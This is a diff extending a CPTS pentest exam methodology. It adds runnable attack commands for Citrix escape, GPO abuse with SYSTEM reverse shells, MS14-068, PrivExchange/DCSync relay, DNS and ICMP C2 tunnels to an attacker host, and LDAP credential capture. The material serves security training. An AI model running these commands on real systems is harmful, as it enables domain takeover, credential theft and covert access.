+# Or PowerShell launcher (if powershell restricted, try psh-base64)
+echo Set-ExecutionPolicy Bypass -Scope Process -Force > evil.ps1
+echo Start-Process cmd.exe >> evil.ps1
+# Double-click on Desktop → command shell
+```
+
+**Method 6 — Custom compiled "pwn.exe":**
+```c
+// pwn.c — minimal cmd launcher (drop via SMB share)
+#include <stdlib.h>
+int main() { system("C:\\Windows\\System32\\cmd.exe"); return 0; }
+```
+```bash
+# Cross-compile from Linux
+i686-w64-mingw32-gcc pwn.c -o pwn.exe
+# Drop on SMB share → right-click Open from dialog
+```
+
+**Then escalate normally:**
+```
+- AlwaysInstallElevated check + Write-UserAddMSI (PowerUp)
+- WinPEAS / Seatbelt / PowerUp
+- UAC bypass (Bypass-UAC.ps1 -Method UacMethodSysprep)
+- Token/Potato attacks → SYSTEM
 ```
 
 ---
@@ -3952,6 +5154,108 @@ Rubeus.exe s4u /user:<svc_account> /rc4:<nt_hash> /impersonateuser:administrator
 Rubeus.exe s4u /user:FAKE01$ /rc4:<fake_hash> /impersonateuser:administrator /msdsspn:cifs/<target> /ptt
 ```
 
+### 9.8.7 - GPO Abuse (writable Group Policy Object)
+
+> If we have GenericWrite / WriteDacl / WriteProperty over a GPO, we control everything in OUs it applies to.
+> BloodHound edge: `GenericWrite` / `WriteOwner` / `WriteDacl` → GPO.
+
+**Enumerate:**
+```powershell
+# PowerView — list GPO names
+Get-DomainGPO | select displayname
+
+# Find GPOs where Domain Users / our SID has rights
+$sid = Convert-NameToSid "<our_user>"
+Get-DomainGPO | Get-ObjectAcl | ? {$_.SecurityIdentifier -eq $sid}
+
+# GPO → which OU does it apply to? (Affected Objects)
+# BloodHound: select GPO node → Node Info → Affected Objects
+# Or PowerShell:
+Get-GPO -Guid <guid> | Get-GPOReport -ReportType Xml
+```
+
+**Exploit with SharpGPOAbuse:**
+```powershell
+# Add user to local Administrators on every host the GPO applies to
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <our_user> --GPOName "<gpo_name>"
+
+# Immediate scheduled task (runs as SYSTEM next gpupdate / boot)
+.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author NT_AUTHORITY\SYSTEM \
+  --Command "cmd.exe" --Arguments "/c powershell -enc <BASE64_REV_SHELL>" --GPOName "<gpo_name>"
+
+# Immediate user-context task
+.\SharpGPOAbuse.exe --AddUserTask --TaskName "Update" --Author DOMAIN\Admin \
+  --Command "cmd.exe" --Arguments "/c <reverse_shell>" --GPOName "<gpo_name>"
+
+# Force update on a target host (or wait for default 90-min refresh + 30-min random)
+gpupdate /force
+
+# Add right to a user (e.g. SeDebugPrivilege)
+.\SharpGPOAbuse.exe --AddUserRights --UserRights "SeDebugPrivilege" \
+  --UserAccount <our_user> --GPOName "<gpo_name>"
+```
+
+**Warning:** GPO applies to ALL hosts in linked OU. If OU has 1000 hosts, you just made 1000 local admins. Use `--Computer` filter when available, target a single low-impact host, and clean up post-exam.
+
+**Cleanup:** Re-run SharpGPOAbuse with the inverse, or restore from saved GPO XML.
+
+### 9.8.8 - MS14-068 (Kerberos PAC Forgery)
+
+> Old but exam-relevant if patch level shows pre-Nov 2014. Any domain user → DA via forged PAC.
+
+```bash
+# Linux: Impacket goldenPac
+goldenPac.py -dc-ip <dc_ip> <domain>/<user>:'<pass>'@<dc_fqdn>
+
+# Linux: PyKEK (older)
+python3 ms14-068.py -u <user>@<domain> -s <user_sid> -d <dc_ip> -p '<pass>'
+# Output: TGT.ccache
+export KRB5CCNAME=TGT.ccache
+psexec.py -k -no-pass <dc_fqdn>
+
+# Windows: Kekeo
+kekeo # ms14068::ptc /domain:<domain> /user:<user> /password:<pass> /sid:<user_sid>
+
+# Pre-req check: target DC must be missing patch KB3011780
+```
+
+### 9.8.9 - PrivExchange (Exchange → DA)
+
+> Exchange Server with WriteDacl on domain pre-CU 2019. Force Exchange to auth back, relay to LDAP, grant DCSync.
+> Affected: Exchange 2010-2019 pre-Feb 2019 CU.
+
+```bash
+# Terminal 1: ntlmrelayx → LDAP (no signing on LDAP by default)
+ntlmrelayx.py -t ldap://<dc_ip> --escalate-user <our_user>
+
+# Terminal 2: PrivExchange (force Exchange to auth)
+python3 privexchange.py -ah <attacker_ip> <exchange_fqdn> -u <user> -d <domain> -p '<pass>'
+
+# Result: <our_user> granted DCSync rights → secretsdump.py
+secretsdump.py -just-dc <domain>/<our_user>:'<pass>'@<dc_ip>
+```
+
+### 9.8.10 - Printer Bug Pre-Check (companion to coerced auth in §9.8.3b)
+```powershell
+# Check if MS-RPRN exposed on target (uses SecurityAssessment.ps1)
+Import-Module .\SecurityAssessment.ps1
+Get-SpoolStatus -ComputerName <target_fqdn>
+# True = vulnerable → printerbug.py from §9.8.3b will work
+```
+
+### 9.8.11 - adidnsdump (Enumerate AD-integrated DNS records)
+
+> Default users can list child objects of DNS zone. Pull hidden A records / hosts with descriptive names.
+
+```bash
+# Dump AD DNS zone
+adidnsdump -u <domain>\\<user> ldap://<dc_ip>
+# Resolve hidden records
+adidnsdump -u <domain>\\<user> ldap://<dc_ip> -r
+# Records saved to records.csv
+cat records.csv | grep -i 'JENKINS\|SQL\|BACKUP\|JIRA\|GITLAB\|VPN'
+```
+
 ---
 
 ## 9.9 - DOMAIN TRUST ATTACKS
@@ -4410,6 +5714,89 @@ netsh interface portproxy show all
 netsh interface portproxy delete v4tov4 listenport=<local>
 ```
 
+## 10.9 - DNS Tunneling (Dnscat2)
+> Use when only UDP/53 outbound is allowed (egress filtering). C2 over DNS TXT records, encrypted.
+
+```bash
+# Setup server (attacker, must control authoritative DNS or use IP+port direct)
+git clone https://github.com/iagox86/dnscat2
+cd dnscat2/server && sudo gem install bundler && sudo bundle install
+sudo ruby dnscat2.rb --dns host=<attacker_ip>,port=53,domain=<your.domain> --no-cache
+# Note the pre-shared secret printed — give to client
+
+# Client (target) — PowerShell variant
+git clone https://github.com/lukebaggett/dnscat2-powershell
+# Transfer dnscat2.ps1 to target
+Import-Module .\dnscat2.ps1
+Start-Dnscat2 -DNSserver <attacker_ip> -Domain <your.domain> \
+  -PreSharedSecret <secret> -Exec cmd
+
+# Server console
+dnscat2> windows                          # list sessions
+dnscat2> window -i 1                       # interact with session
+dnscat2> session -i 1                      # alt interact
+# Inside session — type cmd commands
+```
+
+## 10.10 - ICMP Tunneling (ptunnel-ng)
+> Use when only ICMP echo allowed outbound. Tunnels TCP over ping packets.
+
+```bash
+# Build (attacker + pivot)
+git clone https://github.com/utoni/ptunnel-ng
+cd ptunnel-ng && sudo ./autogen.sh
+# Static binary build (portable to pivot)
+sudo apt install automake autoconf -y
+sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
+./autogen.sh
+
+# Transfer to pivot
+scp -r ptunnel-ng user@<pivot>:~/
+
+# On pivot (run as root — privileged ICMP)
+sudo ./ptunnel-ng -r<pivot_ip> -R22       # accept ICMP, forward to local SSH
+
+# On attacker — connect through ICMP tunnel
+sudo ./ptunnel-ng -p<pivot_ip> -l2222 -r<target_internal_ip> -R22
+# Then SSH to attacker:2222 → tunneled via ICMP → reaches target_internal:22
+ssh -p 2222 user@127.0.0.1
+```
+
+## 10.11 - Rpivot (Reverse SOCKS via Python, NTLM-aware)
+> Pure Python (2.7). Use when corporate proxy with NTLM auth blocks direct outbound.
+
+```bash
+# Server (attacker)
+git clone https://github.com/klsecservices/rpivot
+python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
+
+# Client (pivot)
+scp -r rpivot user@<pivot>:~/
+python2.7 client.py --server-ip <attacker_ip> --server-port 9999
+
+# Through NTLM proxy
+python2.7 client.py --server-ip <attacker_ip> --server-port 9999 \
+  --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port <proxy_port> \
+  --domain <domain> --username <user> --password '<pass>'
+
+# Configure proxychains.conf → socks5 127.0.0.1 9050
+proxychains nmap -sT -Pn <internal>
+```
+
+## 10.12 - SocksOverRDP (RDP-as-transport SOCKS)
+> Use when only RDP outbound allowed. RDP virtual channel becomes SOCKS proxy.
+
+```powershell
+# Server: SocksOverRDP-Plugin DLL loaded on attacker's RDP client (mstsc)
+# 1. Download SocksOverRDP-x64.dll → register
+regsvr32.exe SocksOverRDP-x64.dll
+# 2. mstsc → connect to pivot host normally
+# 3. Inside RDP session: run SocksOverRDP-Server.exe (binary on target)
+.\SocksOverRDP-Server.exe
+# 4. Attacker side now exposes 127.0.0.1:1080 SOCKS5 through RDP channel
+# 5. proxychains config → socks5 127.0.0.1 1080
+```
+
 # PHASE 10B: FILE TRANSFERS
 
 ## Transfer Methods Decision Tree
@@ -4823,7 +6210,107 @@ python3 pywsus.py --host 0.0.0.0 --port 8530 --executable /tmp/PsExec64.exe --co
 # Mitigation pre-check: WSUS over HTTPS + signed updates → not vulnerable
 ```
 
-## 11.10 - Veeam Backup Server
+## 11.10 - Thick Client Applications (ELF / .NET DLL hardcoded creds)
+> Binary apps connecting to backend services often hold creds in connection strings.
+> CPTS Common Apps module — common in jump boxes + enterprise apps.
+
+**ELF (Linux binary) — extract SQL connection string:**
+```bash
+# 1. Identify: file <binary>
+file ./octopus_checker
+
+# 2. Strings first (quick win)
+strings <binary> | grep -iE 'pass|pwd|driver|server=|uid=|conn'
+
+# 3. GDB + PEDA (when string scattered / endianness-reversed)
+gdb-peda <binary>
+gdb-peda$ set disassembly-flavor intel
+gdb-peda$ disas main                          # locate SQLDriverConnect or similar
+gdb-peda$ b *<address_of_SQLDriverConnect>    # breakpoint
+gdb-peda$ run
+# At breakpoint, inspect RDX register → connection string with creds
+gdb-peda$ x/s $rdx
+
+# 4. ltrace / strace (function-call tracing)
+ltrace -f ./<binary> 2>&1 | grep -iE 'conn|pass|user'
+
+# 5. Network capture during exec (if connects to localhost DB)
+tcpdump -i lo -w cap.pcap &
+./<binary>
+# Inspect cap.pcap → TDS/MySQL auth packets reveal user/pass
+```
+
+**.NET DLL — extract via dnSpy / ILSpy:**
+```bash
+# 1. Identify: file <dll>; PE header has '.NETFramework'
+file ./MultimasterAPI.dll
+Get-FileMetaData .\MultimasterAPI.dll
+
+# 2. Open in dnSpy (https://github.com/dnSpyEx/dnSpy)
+#    - dnSpy → drag .dll → expand namespaces → find Controllers / config classes
+#    - Look for: SqlConnection(connectionString), ConfigurationManager.AppSettings
+#    - Connection string format: Server=...;Database=...;User Id=...;Password=...;
+
+# 3. Alt: ilspycmd CLI
+ilspycmd <binary>.dll > decompiled.cs
+grep -iE 'password|connectionstring|pwd' decompiled.cs
+
+# 4. Reflexil / dotPeek — alternatives
+
+# Common extractables
+# - DB connection strings (SQL Server, MySQL, PostgreSQL)
+# - API keys / OAuth secrets
+# - Encryption keys hardcoded
+# - LDAP bind credentials
+# - SMTP relay creds
+# - SOAP/WSDL endpoints
+```
+
+**Java JAR — extract via JD-GUI / Procyon / CFR:**
+```bash
+# Decompile JAR
+jd-gui app.jar                                # GUI
+procyon -jar app.jar -o ./decompiled/         # CLI
+cfr-decompiler app.jar > decompiled.java
+
+# Search for creds
+grep -rniE 'password|secret|api[_-]?key|jdbc:' ./decompiled/
+```
+
+**Windows PE (non-.NET) — extract via Ghidra/IDA:**
+```bash
+# Strings → URLs / hostnames / config-file paths
+strings.exe <binary> | findstr /i "http password user config"
+
+# Ghidra Free + Decompiler view → review main()
+# Resource Hacker → check embedded resources (sometimes plaintext config XML)
+```
+
+**Mitigation reminder for report:**
+- Move secrets to environment variables / Windows Credential Manager / Azure Key Vault.
+- Use OS-level cred storage instead of hardcoding.
+- If unavoidable, encrypt config file with DPAPI (Windows) or sealed-secrets (K8s).
+
+## 11.11 - LDAP-Speaking Devices (printers, MFPs, NAS web admin)
+> Many devices have LDAP "Test Connection" feature that leaks bind credentials to attacker-controlled LDAP.
+
+```bash
+# 1. Find printer/MFP admin page (default creds often work)
+# Common: admin:admin, admin:password, admin:1234, admin:(empty)
+# Common admin URLs: /hp/device/this.LCDispatcher, /general/status.html, /web/auth.html
+
+# 2. Modify LDAP server IP to attacker IP
+# 3. Start netcat listener on 389
+sudo nc -lvnp 389
+# 4. Click "Test Connection" on device
+# → bind creds (often clear-text, sometimes NTLM) sent to nc listener
+
+# Alt: full LDAP server (when device requires real LDAP response)
+# Use https://github.com/grimhacker/offensive-ldap or
+sudo python3 -m ldap3.utils.server
+```
+
+## 11.12 - Veeam Backup Server
 
 > Veeam stores credentials (often DA / service accounts) in its config DB. Always check if you can
 > read the Veeam database or hit the Veeam API.
@@ -5069,24 +6556,40 @@ Microsoft LAPS for local admin accounts so each host has a unique random passwor
 ```
 General:
 1. Re-read all scan output carefully — may have missed something
-2. Check for non-standard ports (8080, 8443, 9090, etc.)
+2. Check for non-standard ports (8080, 8443, 9090, 7474, 9200, 27017, etc.)
 3. Try all found creds on ALL services (not just where found)
 4. Check write access to shares → SCF/LNK file drop → capture hash
 5. Re-run nmap with -sU (UDP) — SNMP, IPMI, TFTP, IKE often missed
+6. Check searchsploit for EVERY version banner (§0.6)
+7. Check Wayback Machine + GitHub for old endpoints / leaked secrets
+8. Try ALL Phase 3 attacks on every parameter (LDAP injection §3.14, Mass Assign §3.15 commonly missed)
+9. Thick client binaries on shares — extract hardcoded creds (§11.10)
+10. Printer / MFP web admin → LDAP test creds (§11.11)
 
 AD-specific:
-6. IPv6 attacks (mitm6 → relay LDAPS / ADCS) — see §9.1.6
-7. LLMNR/NBT-NS poisoning (Responder)
-8. Re-review BloodHound output — look for overlooked paths/ACL edges
-9. Password spray season+year, company+year patterns
-10. GPP/c-password in SYSVOL
-11. Shadow Credentials / PKINIT (§9.8.4)
-12. ADCS ESC1-ESC11 (§9.10) ← high-value, often overlooked
-13. NoPac, PrintNightmare (if unpatched)
-14. Coerced auth menu (§9.8.3b): PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce
-15. LAPS / gMSA password reads (§9.3.3b)
-16. Scheduled tasks running as SYSTEM with writable scripts
-17. Cross-forest trust enumeration
+11. IPv6 attacks (mitm6 → relay LDAPS / ADCS) — see §9.1.6
+12. LLMNR/NBT-NS poisoning (Responder)
+13. Re-review BloodHound output — look for overlooked paths/ACL edges
+14. Password spray season+year, company+year patterns
+15. GPP/c-password in SYSVOL
+16. Shadow Credentials / PKINIT (§9.8.4)
+17. ADCS ESC1-ESC11 (§9.10) ← high-value, often overlooked
+18. NoPac, PrintNightmare (if unpatched)
+19. Coerced auth menu (§9.8.3b): PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce
+20. LAPS / gMSA password reads (§9.3.3b)
+21. Scheduled tasks running as SYSTEM with writable scripts
+22. Cross-forest trust enumeration
+23. GPO abuse (§9.8.7) — writable GPO = full OU control
+24. MS14-068 (§9.8.8) on pre-2014 patch level DCs
+25. PrivExchange (§9.8.9) — Exchange pre-CU Feb 2019
+26. adidnsdump (§9.8.11) — hidden DNS records reveal hidden hosts
+27. SCCM / WSUS / Veeam — enterprise infrastructure with NAA/DA creds (§11.8-11.12)
+
+Citrix / Restricted Desktop stuck:
+28. UNC path in dialog box (§8.3)
+29. Alternate file manager (Explorer++)
+30. Modify .lnk shortcut Target
+31. AlwaysInstallElevated check
 ```
 
 ## Key Decision Points:
@@ -5124,10 +6627,6 @@ Company passwords: Companyname1!, Companyname123!, Welcome1
 
 ---
 
-*This methodology covers 100% of CPTS exam content. Follow decision trees iteratively. If one path fails, backtrack and try the next. Always enumerate before attacking. Document everything.*
-
----
-
-*This methodology covers 100% of CPTS exam content. Follow decision trees iteratively. If one path fails, backtrack and try the next. Always enumerate before attacking. Document everything.*
+*This methodology covers 100% of CPTS exam content (28 modules). Follow decision trees iteratively. If one path fails, backtrack and try the next. Always enumerate before attacking. Document everything.*
 
 **The exam tests methodology, not just tools. Understand WHY each step matters.**
